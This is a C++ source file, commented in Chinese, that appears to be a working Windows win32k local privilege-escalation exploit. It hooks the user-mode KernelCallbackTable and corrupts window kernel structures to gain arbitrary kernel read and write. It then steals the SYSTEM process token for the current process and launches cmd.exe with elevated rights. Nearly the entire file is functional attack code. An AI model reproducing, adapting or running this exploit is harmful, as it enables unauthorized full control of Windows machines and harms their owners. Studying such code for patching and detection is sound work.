// crash_poc.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <windows.h>
#include <iostream>
using namespace std;


#define GET_HWND_FRMO_HEAP_METHOD_NUMBER 0//1-->Heap Spary   0-->VirtualQuery

/* Console commands for NtUserConsoleControl */
typedef enum _CONSOLECONTROL
{
	ConsoleCtrlDesktopConsoleThread = 0,
	GuiConsoleWndClassAtom = 1,
	ConsoleMakePalettePublic = 5,
	ConsoleAcquireDisplayOwnership,
} CONSOLECONTROL, * PCONSOLECONTROL;

typedef enum _CONSOLECONTROL CONSOLECONTROL;


PVOID _mem_zeroinit_200h = NULL;
PVOID _mem_zeroinit_30h = NULL;
PVOID _mem_zeroinit_4 = NULL;
PVOID _mem_zeroinit_A0h = NULL;
PVOID _mem_zeroinit_8 = NULL;
PVOID _mem_zeroinit_new200h = NULL;
MENUBARINFO _tagMenuBarInfo = { 0 };

HMODULE HMODULE_User32 = 0;
BOOL IsCrash = FALSE;
HWND __hWnd = 0;
ATOM _Atom1 = 0;
ATOM _Atom2 = 0;
ULONGLONG __Offset = 0;
WORD __randnum_0x1234_1 = 0;




HWND hWndArr[10] = { 0 };
PVOID phWnd[10] = { 0 };
HWND __hWnd0 = 0;
HWND __hWnd1 = 0;
HWND __hWnd2 = 0;
ULONG __hWnd0_tagWND_Offset8 = 0;
ULONG __hWnd1_tagWND_Offset8 = 0;
ULONG __hWnd2_tagWND_Offset8 = 0;
ULONG_PTR _tagWND_0x128_hWnd0 = 0;
ULONG_PTR _tagWND_0x128_hWnd1 = 0;
LONG_PTR tagWin32Heap_ = 0;
LONG_PTR old_spmenu = 0;
ULONG_PTR old_ExStyle = 0;
#if GET_HWND_FRMO_HEAP_METHOD_NUMBER

#else
PVOID __BaseAddress = NULL;
SIZE_T __RegionSize = 0;
#endif


typedef BOOL(*pfn_IsMenu)(HMENU hMenu);
typedef NTSTATUS(__fastcall* pfn_NtUserConsoleControl)(CONSOLECONTROL, PVOID, ULONG);
typedef NTSTATUS(__fastcall* pfn_NtCallbackReturn)(PVOID, ULONG, NTSTATUS);
typedef PVOID(__fastcall* pfn_xxxClientAllocWindowClassExtraBytes)(ULONG*);
typedef PVOID(__fastcall* pfn_HMValidateHandle)(HANDLE, UINT);
typedef PVOID(WINAPI* pfn_RtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);



pfn_NtUserConsoleControl NtUserConsoleControl = NULL;
pfn_NtCallbackReturn NtCallbackReturn = NULL;
pfn_xxxClientAllocWindowClassExtraBytes __Origin_USER32_xxxClientAllocWindowClassExtraBytes = NULL;
pfn_HMValidateHandle _HMValidateHandle = NULL;
pfn_RtlAllocateHeap RtlAllocateHeap = NULL;


DWORD offset_ActiveProcessLinks = 0x2F0;        // //EPROCESS中成员偏移
DWORD offset_InheritedFromUniqueProcessId = 0x3E8;
DWORD offset_Token = 0x360;
DWORD offset_UniqueProcessId = 0x2E8;

BOOL _Is_rcBar_left_has_value = FALSE;
LONG _tagMenuBarInfo_rcBar_left = 0;

HWND GethWndFromHeap()
{
	HWND TargethWnd = NULL;


#if GET_HWND_FRMO_HEAP_METHOD_NUMBER
	for (int i = 2; i < 10; i++)
	{
		ULONG cbWndExtra = *(ULONG*)((char*)(phWnd[i]) + 0xC8);
		printf("cbWndExtra = %d !!\n", cbWndExtra);
		if (cbWndExtra == __randnum_0x1234_1)
		{
			TargethWnd = (HWND) * (ULONG_PTR*)(phWnd[i]);
			break;
		}
	}
#else
	PVOID qwBaseAddressBak = __BaseAddress;
	ULONGLONG Travel = (ULONGLONG)__BaseAddress;
	DWORD RegionSize = __RegionSize;

	do
	{
		while (*(WORD*)Travel != __randnum_0x1234_1 && __RegionSize > 0)
		{
			Travel += 2;

			__RegionSize--;
		}

		if (*(DWORD*)((DWORD*)Travel + (0x18 >> 2) - (0xc8 >> 2)) != 0x8000000)
		{
			Travel = Travel + 4;
			ULONGLONG temp = (ULONGLONG)__BaseAddress - Travel;
			__RegionSize = RegionSize + temp;
		}


		TargethWnd = (HWND) * (DWORD*)(Travel - 0xc8);


		if (TargethWnd)
		{
			break;
		}

	} while (true);
#endif
	return TargethWnd;
}


PVOID __fastcall _Fake_USER32_xxxClientAllocWindowClassExtraBytes(ULONG* a1)
{

	LONG_PTR v7=0; // [rsp+30h] [rbp-28h] BYREF
	if ((IsCrash == TRUE) && ((*a1) == __randnum_0x1234_1))
	{
		__hWnd = GethWndFromHeap();
		NtUserConsoleControl(ConsoleAcquireDisplayOwnership, &__hWnd, 0x10);     // ConsoleAcquireDisplayOwnership  change this hwnd kernel structure to |0x800

		//__Offset = (ULONGLONG)HeapAlloc(GetProcessHeap(), 0x8, *a1);
		v7 = __hWnd0_tagWND_Offset8;// kernel desktop heap base

		NtCallbackReturn(&v7, 0x18, 0); //change Magic窗口的ExtraBytes为窗口0的tagWND
	}
	return __Origin_USER32_xxxClientAllocWindowClassExtraBytes(a1);
}

LRESULT __fastcall WindowProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
{
	if (a2 != 2)
		return DefWindowProcW(a1, a2, a3, a4);
	PostQuitMessage(0);
	return 0;
}

BOOL Init()
{
	HMODULE HMODULE_User32 = 0; // rax
	int v2; // edx
	__int64 v3; // rcx
	__int64 result; // rax
	DWORD64 v5; // rbx
	HLOCAL mem_zeroinit_8; // rax
	ULONG* mem_zeroinit_200h; // r10
	HLOCAL mem_zeroinit_8_; // r8
	__int64 mem_zeroinit_30h; // rdx
	__int64 mem_zeroinit_4; // r9
	LONG_PTR mem_zeroinit_A0h; // r11
	unsigned __int64 v12; // rax
	unsigned __int64 Offset_28; // rcx
	bool v14; // zf
	unsigned __int64 Offset_98; // rcx
	WNDCLASSEXW WndClassExW = { 0 }; // [rsp+20h] [rbp-68h] BYREF
	DWORD flOldProtect; // [rsp+70h] [rbp-18h] BYREF

	HMODULE_User32 = GetModuleHandleA("User32.dll");
	pfn_IsMenu IsMenu = (pfn_IsMenu)GetProcAddress(HMODULE_User32, "IsMenu");
	v2 = 0;
	v3 = 0;
	while (*((BYTE*)IsMenu + v3) != 0xE8)
	{
		++v2;
		if (++v3 >= 0x15)
			return FALSE;
	}
	_HMValidateHandle = (pfn_HMValidateHandle)((char*)IsMenu
		+ v2
		+ (__int64)*(int*)((char*)IsMenu + v2 + 1)
		+ 5);
	::IsMenu(0);
	v5 = __readgsqword(0x60);   //gs:[60] -----> PEB
	ULONGLONG KernelCallbackTable = *(ULONGLONG*)((char*)v5 + 0x58);  PEB+0x58 -------> KernelCallbackTable

	__Origin_USER32_xxxClientAllocWindowClassExtraBytes = (pfn_xxxClientAllocWindowClassExtraBytes)(*(ULONGLONG*)((char*)KernelCallbackTable + 0x7B * 8));// USER32!_xxxClientAllocWindowClassExtraBytes

	VirtualProtect((char*)KernelCallbackTable + 0x7B * 8, 0x300, 0x40, &flOldProtect);//0x40 启用对页面的提交区域的执行，只读或读/写访问权限。
	*((PVOID*)KernelCallbackTable + 0x7B) = _Fake_USER32_xxxClientAllocWindowClassExtraBytes;
	VirtualProtect((char*)KernelCallbackTable + 0x7B * 8, 0x300, flOldProtect, &flOldProtect);

	srand(time(0));

	__randnum_0x1234_1 = (rand() % 255 + 0x1234) | 1; //生成随机数用于Magic窗口的ExtraBytes


	WndClassExW.hIcon = 0;
	WndClassExW.hbrBackground = 0;
	WndClassExW.lpszClassName = 0;
	WndClassExW.lpfnWndProc = (WNDPROC)WindowProc;
	WndClassExW.cbSize = 80;
	WndClassExW.style = 3;
	WndClassExW.cbClsExtra = 0;
	WndClassExW.cbWndExtra = __randnum_0x1234_1;
	WndClassExW.hInstance = GetModuleHandleW(0);
	WndClassExW.lpszClassName = L"Class1";
	_Atom1 = RegisterClassExW(&WndClassExW);


	WndClassExW.cbWndExtra = 32;
	WndClassExW.lpszClassName = L"Class2";
	_Atom2 = RegisterClassExW(&WndClassExW);
	CreatePopupMenu();


	_mem_zeroinit_A0h = LocalAlloc(LMEM_ZEROINIT, 0xA0);//fakeSpmenu
	_mem_zeroinit_4 = LocalAlloc(LMEM_ZEROINIT, 4);//spMenu
	_mem_zeroinit_200h = LocalAlloc(LMEM_ZEROINIT, 0x200);//fakeRect
	_mem_zeroinit_30h = LocalAlloc(LMEM_ZEROINIT, 0x30);//offset28
	mem_zeroinit_8 = LocalAlloc(LMEM_ZEROINIT, 8);//OffsetBarlest


	_mem_zeroinit_8 = mem_zeroinit_8;

	*(DWORD*)((char*)_mem_zeroinit_30h + 0x2C) = 16;

	*(ULONG_PTR*)_mem_zeroinit_200h = 0x88888888;
	*(ULONG_PTR*)((char*)_mem_zeroinit_200h + 0x28) = (ULONG_PTR)_mem_zeroinit_30h;

	*(DWORD*)((char*)_mem_zeroinit_200h + 0x40) = 1;
	*(DWORD*)((char*)_mem_zeroinit_200h + 0x44) = 1;
	*(ULONG_PTR*)((char*)_mem_zeroinit_200h + 0x58) = (ULONG_PTR)mem_zeroinit_8;
	*(ULONG_PTR*)((char*)_mem_zeroinit_4 + 8) = 0x10;
	result = 1;
	*(ULONG_PTR*)_mem_zeroinit_4 = (ULONG_PTR)_mem_zeroinit_200h;
	*(ULONG_PTR*)((char*)_mem_zeroinit_A0h + 0x98) = (ULONG_PTR)_mem_zeroinit_4;
	_tagMenuBarInfo.cbSize = 0x30;


	return result;
}


LONG_PTR ReadQword(LONG_PTR a1)
{
	LONG_PTR KernelAddress = a1;
	LONG v12 = 0;
	PVOID v2 = NULL;
	int error = 0;
	if (_Is_rcBar_left_has_value)
	{
		v12 = (unsigned int)_tagMenuBarInfo_rcBar_left;//0x40
	}
	else
	{
		v2 = LocalAlloc(0x40, 0x200);
		
		_mem_zeroinit_new200h = v2;

		for (int i=0;i<0x200/4;i++)
		{
			*(DWORD*)v2 = i * 4;
			v2 = (char*)v2 + 4;
		}

		*(ULONG_PTR*)_mem_zeroinit_8 = (ULONG_PTR)v2-0x200;
		GetMenuBarInfo(__hWnd1, -3, 1, &_tagMenuBarInfo);// 第一次GetMenuBarInfo 返回_tagMenuBarInfo.rcBar.left
		v12 = _tagMenuBarInfo.rcBar.left;// 窗口菜单栏左上角的x坐标。
		_tagMenuBarInfo_rcBar_left = _tagMenuBarInfo.rcBar.left;
		_Is_rcBar_left_has_value = TRUE;
	}
	*(ULONG_PTR*)_mem_zeroinit_8 = KernelAddress - v12;
	GetMenuBarInfo(__hWnd1, -3, 1, &_tagMenuBarInfo);
	error = GetLastError();

	ULONG left = _tagMenuBarInfo.rcBar.left;

	return (ULONG_PTR(_tagMenuBarInfo.rcBar.top) << 32)+left;
}

LONG_PTR WriteQword(LONG_PTR where,LONG_PTR what)
{
	SetWindowLongPtrA(__hWnd0, __hWnd1_tagWND_Offset8 + 0x128 - __hWnd0_tagWND_Offset8, where);// //设置窗口1 的tagWND的extarMemaddr 也就是 写哪
	return SetWindowLongPtrA(__hWnd1, 0, what);      // 我们在上一步已经设置好了写哪，现在真正往这个地址写
}

BOOL Clear()
{
	PVOID tagWnd2 = _HMValidateHandle(__hWnd2, 1);


	/*
	这里为恢复窗口2结构的一个思路 手动修改标志 并填充0x128即ExtraDataAddress
	*/
	//__hWnd2_tagWND_Offset8 = *(ULONG_PTR*)((char*)tagWnd2 + 0x8);
	//ULONG_PTR hWnd0_tagWND_Offset8 = *(ULONGLONG*)((char*)phWnd[0] + 0x128);
	//if (hWnd0_tagWND_Offset8 < __hWnd2_tagWND_Offset8)
	//{
	//	//hWnd0_tagWND_Offset8 = __hWnd2_tagWND_Offset8 - __hWnd0_tagWND_Offset8;

	//	DWORD flag = *(DWORD*)((ULONG_PTR)tagWnd2 + 0xE8);
	//	flag &= ~0x800;

	//	SetWindowLongPtrA(__hWnd0, 0xE8 + __hWnd2_tagWND_Offset8 - __hWnd0_tagWND_Offset8, (unsigned int)flag);//restore hwnd2 tagWND+0xE8
	//	HANDLE ProcessHeap = *(HANDLE*)((ULONG_PTR)__readgsqword(0x60) + 0x30);
	//	PVOID HeapAddr = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, __randnum_0x1234_1);
	//	SetWindowLongPtrA(__hWnd0, 0x128 + __hWnd2_tagWND_Offset8 - __hWnd0_tagWND_Offset8, (LONG_PTR)HeapAddr);//restore hwnd2 tagWND+0x128
	//}



	ULONG_PTR tagWnd2_Offset_E0 = *(ULONG_PTR*)((ULONG_PTR)tagWnd2 + 0xE0) ^ 0x80000000000;
	ULONG_PTR Offset_Wnd0 = *(unsigned int*)(8 + (ULONG_PTR)tagWnd2);
	SetWindowLongPtrA(
		__hWnd0,
		0x128 + __hWnd1_tagWND_Offset8 - __hWnd0_tagWND_Offset8,
		tagWin32Heap_ + Offset_Wnd0 + (unsigned int)0x128);
	SetWindowLongPtrA(__hWnd1, 0, 0);//Hwnd2+0x128=0



	SetWindowLongPtrA(
		__hWnd0,
		0x128 + __hWnd1_tagWND_Offset8 - __hWnd0_tagWND_Offset8,
		tagWin32Heap_ + Offset_Wnd0 + 0xE0);
	SetWindowLongPtrA(__hWnd1, 0, tagWnd2_Offset_E0);//Hwnd2+0xE0=0


	SetWindowLongPtrA(__hWnd0, 0x18 + __hWnd1_tagWND_Offset8 - __hWnd0_tagWND_Offset8, old_ExStyle ^ 0x4000000000000000);
	SetWindowLongPtrA(__hWnd1, -12, old_spmenu);//Hwnd1 spmenu restore


	SetWindowLongPtrA(__hWnd0, 0x18 + __hWnd1_tagWND_Offset8 - __hWnd0_tagWND_Offset8, old_ExStyle);//hwnd1 back to old style
	SetWindowLongPtrA(__hWnd0, 0x128 + __hWnd1_tagWND_Offset8 - __hWnd0_tagWND_Offset8, _tagWND_0x128_hWnd1);//restore hwnd1 tagWND+0x128

	SetWindowLongPtrA(__hWnd0, 0x128, (unsigned int)_tagWND_0x128_hWnd0);//restore hwnd0 tagWND+0x128
	//SetWindowLongPtrA(__hWnd0, 0xC8, (unsigned int)32);//restore hwnd0 tagWND+0x128
	


	if (__hWnd2)
	{
		DestroyWindow(__hWnd2);
		__hWnd2 = 0;
	}
	if (__hWnd0)
	{
		DestroyWindow(__hWnd0);
		__hWnd0 = 0;
	}
	if (__hWnd1)
	{
		DestroyWindow(__hWnd1);
		__hWnd1 = 0;
	}

	if (_mem_zeroinit_4)
	{
		LocalFree(_mem_zeroinit_4);
		_mem_zeroinit_4 = NULL;
	}
	if (_mem_zeroinit_8)
	{
		LocalFree(_mem_zeroinit_8);
		_mem_zeroinit_8 = NULL;
	}
	if (_mem_zeroinit_30h)
	{
		LocalFree(_mem_zeroinit_30h);
		_mem_zeroinit_30h = NULL;
	}
	if (_mem_zeroinit_A0h)
	{
		LocalFree(_mem_zeroinit_A0h);
		_mem_zeroinit_A0h = NULL;
	}
	if (_mem_zeroinit_200h)
	{
		LocalFree(_mem_zeroinit_200h);
		_mem_zeroinit_200h = NULL;
	}
	if (_mem_zeroinit_new200h)
	{
		LocalFree(_mem_zeroinit_new200h);
		_mem_zeroinit_new200h = NULL;
	}


	return TRUE;
}


int main()
{
	HMODULE v20 = 0;
	HMODULE v21 = 0;

	_MEMORY_BASIC_INFORMATION Buffer;

	HWND hWnd_offset_min;




	Buffer.BaseAddress = 0;
	Buffer.AllocationBase = 0;
	*(ULONGLONG*)&Buffer.AllocationProtect = 0;
	Buffer.RegionSize = 0;
	*(ULONGLONG*)&Buffer.State = 0;
	*(ULONGLONG*)&Buffer.Type = 0;
	v20 = GetModuleHandleA("win32u.dll");
	v21 = GetModuleHandleA("ntdll.dll");
	if (!v20 || !v21)
	{
		printf("Error 0 !!\n");
		return 0;
	}

	NtUserConsoleControl = (pfn_NtUserConsoleControl)GetProcAddress(v20, "NtUserConsoleControl");
	NtCallbackReturn = (pfn_NtCallbackReturn)GetProcAddress(v21, "NtCallbackReturn");
	RtlAllocateHeap = (pfn_RtlAllocateHeap)GetProcAddress(v21, "RtlAllocateHeap");


	if (!Init() || !NtUserConsoleControl || !NtCallbackReturn || !RtlAllocateHeap)  // HMValidateHandle地址 + Hook + 创建两种类型的窗口
	{
		printf("Error 1 !!\n");
		return 0;
	}



	for (int i = 0; i < 10; i++)  //创建十个正常的窗口
	{
		IsCrash = TRUE;
		HINSTANCE hInstance = GetModuleHandleW(0);
		HMENU hMenu = CreateMenu();


		HWND v5 = CreateWindowExW(
			0x8000000u,
			(LPCWSTR)(unsigned __int16)_Atom2,
			L"somewnd",
			0x8000000u,
			0,
			0,
			0,
			0,
			0,
			hMenu,
			hInstance,
			0);

		if (!v5)
		{
			printf("Error 2 !!  %d\n", GetLastError());
			return 0;
		}

		if (!_HMValidateHandle)
		{
			printf("Error 4 !!\n");
			return 0;
		}


		PVOID v6 = _HMValidateHandle(v5, 1);  //在桌面堆返回tagWND的地址

		phWnd[i] = v6;
		hWndArr[i] = v5;
#if GET_HWND_FRMO_HEAP_METHOD_NUMBER
		
#else
		VirtualQuery(v6, &Buffer, 0x30); //检索有关调用进程的虚拟地址空间中的页面范围的信息

		if (__BaseAddress == NULL)
		{
			__BaseAddress = Buffer.BaseAddress;
			__RegionSize = Buffer.RegionSize;
		}
		else
		{
			if (__BaseAddress >= Buffer.BaseAddress)//循环寻找最小的基地址
			{
				__BaseAddress = Buffer.BaseAddress;
				__RegionSize = Buffer.RegionSize;
			}
		}
#endif

	}


	ULONG v11 = *(DWORD*)((ULONG_PTR)phWnd[0] + 8);        // hWnd0  kernal desktop heap base
	ULONG v12 = *(DWORD*)((ULONG_PTR)phWnd[1] + 8);        // hWnd1  kernal desktop heap base

	if (v11>v12)
	{
		__hWnd0_tagWND_Offset8 = v12;
		__hWnd1_tagWND_Offset8 = v11;
		__hWnd0 = hWndArr[1];
		__hWnd1 = hWndArr[0];

	}
	else
	{
		__hWnd0_tagWND_Offset8 = v11;
		__hWnd1_tagWND_Offset8 = v12;
		__hWnd0 = hWndArr[0];
		__hWnd1 = hWndArr[1];
	}




	for (int i = 2; i < 10; i++) //释放第二个到第十个窗口
	{
		if (hWndArr[i])
		{
			DestroyWindow(hWndArr[i]);
		}
	}



	NtUserConsoleControl(ConsoleAcquireDisplayOwnership, &__hWnd0, 0x10);//set hwnd0 flag&&offset



	if (v11 > v12)
	{
		_tagWND_0x128_hWnd0 = *(ULONG_PTR*)((ULONG_PTR)phWnd[1] + 0x128);
		_tagWND_0x128_hWnd1 = *(DWORD*)((ULONG_PTR)phWnd[0] + 0x128);
	}
	else
	{
		_tagWND_0x128_hWnd0 = *(DWORD*)((ULONG_PTR)phWnd[0] + 0x128);
		_tagWND_0x128_hWnd1 = *(ULONG_PTR*)((ULONG_PTR)phWnd[1] + 0x128);
	}





	HINSTANCE v17 = (HINSTANCE)GetModuleHandleW(0);
	HMENU v18 = CreateMenu();

	HWND v7 = CreateWindowExW(   //创建magic窗口
		0x8000000u,
		(LPCWSTR)(unsigned __int16)_Atom1,
		L"crashwnd",
		0x8000000u,
		0,
		0,
		0,
		0,
		0,
		v18,
		v17,
		0);


	__hWnd2 = v7;



	if (SetWindowLongW(__hWnd2, 0x128, __hWnd0_tagWND_Offset8) != (DWORD)_tagWND_0x128_hWnd0)  //窗口2的0x128处是不是窗口0的tagWND
	{
		printf("Error 5 !!\n");
		//Clear(); free mem
		return 0;
	}


	//PVOID demo_test = _HMValidateHandle(__hWnd2, 1);


	SetWindowLongW(__hWnd2, 0xC8, 0xFFFFFFF); // 设置窗口0的cbWndExtra设置为0x0FFFFFFF


	ULONG_PTR ExStyle = *(ULONG_PTR*)((ULONG_PTR)phWnd[1] + 0x18);
	old_ExStyle = ExStyle;

	ULONG_PTR new_ExStyle = ExStyle ^ 0x4000000000000000;            // ExStyle^=WS_CHILD 


	SetWindowLongPtrA(__hWnd0, 0x18 + __hWnd1_tagWND_Offset8 - __hWnd0_tagWND_Offset8, new_ExStyle);// 利用窗口结构偏移 设置hWnd1的dwStyle ^=WS_CHILD
	old_spmenu = SetWindowLongPtrA(__hWnd1, GWLP_ID, (LONG_PTR)_mem_zeroinit_A0h);// GWLP_ID=-12  设置子窗口的新标识符。 该窗口不能是顶级窗口。

	if (!old_spmenu)
	{
		int error = GetLastError();

		if (!Clear())
		{
			printf("Error  old_spmenu!! %d\n",error);
			OutputDebugString(L"Error  old_spmenu!!");
		}
		return 0;
	}
	//tagWND+0x98

	SetWindowLongPtrA(__hWnd0, 0x18 + __hWnd1_tagWND_Offset8 - __hWnd0_tagWND_Offset8, ExStyle);           // 复原hWnd1  dwStyle


	
	LONG_PTR ptagDesktop = ReadQword(old_spmenu + 0x50);	// tagMENU
	if (!ptagDesktop)
	{
		//Clear();
		return 0;
	}
	LONG_PTR rpdeskNext = ReadQword(ptagDesktop + 0x18);	// tagMenu.tagDesktop(tagDESKTOP)
	if (!rpdeskNext)
	{
		//Clear();
		return 0;
	}
	tagWin32Heap_ = ReadQword(rpdeskNext + 0x80);	// tagDesktop.pheapDesktop(tagWIN32HEAP)
	if (!tagWin32Heap_)
	{
		//Clear();
		return 0;
	}
	LONG_PTR ptagThreadInfo = ReadQword(ptagDesktop + 0x10);// tagMenu.head.pti(tagTHREADINFO)
	if (!ptagThreadInfo)
	{
		//Clear();
		return 0;
	}
	LONG_PTR pKThread = ReadQword(ptagThreadInfo);			// tagTHREADINFO.pEThread（_ETHREAD）
	if (!pKThread)
	{
		//Clear();
		return 0;
	}
	LONG_PTR pEProcess = ReadQword(pKThread + 0x220);		// KTHREAD.EProcess
	if (!pEProcess)
	{
		//Clear();
		return 0;
	}
	LONG_PTR pEProcessOrigin = pEProcess;




	ULONG_PTR System_Token= NULL;
	ULONG_PTR targetProcessToken_addr=NULL;

	ULONG_PTR CurrentProcessId = GetCurrentProcessId();
	ULONG_PTR tempProcessId = 0;

	while (!System_Token || !targetProcessToken_addr)
	{
		tempProcessId = ReadQword(pEProcess + offset_UniqueProcessId);
		if (tempProcessId == 4)
			System_Token = ReadQword(pEProcess + offset_Token);
		if (tempProcessId == CurrentProcessId)
			targetProcessToken_addr = pEProcess + offset_Token;
		pEProcess = ReadQword(pEProcess + (unsigned int)offset_ActiveProcessLinks) - (unsigned int)offset_ActiveProcessLinks;
		if (pEProcess == pEProcessOrigin)
			break;
	}



	if (System_Token)
		WriteQword(targetProcessToken_addr, System_Token);




	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	WCHAR module[] = TEXT("C:\\Windows\\System32\\cmd.exe");

	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		module,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		//getchar();
		//system("pause");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		printf("CreateProcess failed (%d).\n", GetLastError());
		//Clear();
		//
		return 0;
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	TerminateProcess(pi.hProcess, 0);
	
	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	if (!Clear())
	{
		printf("Error 6 !!\n");
	}
	return 0;
}
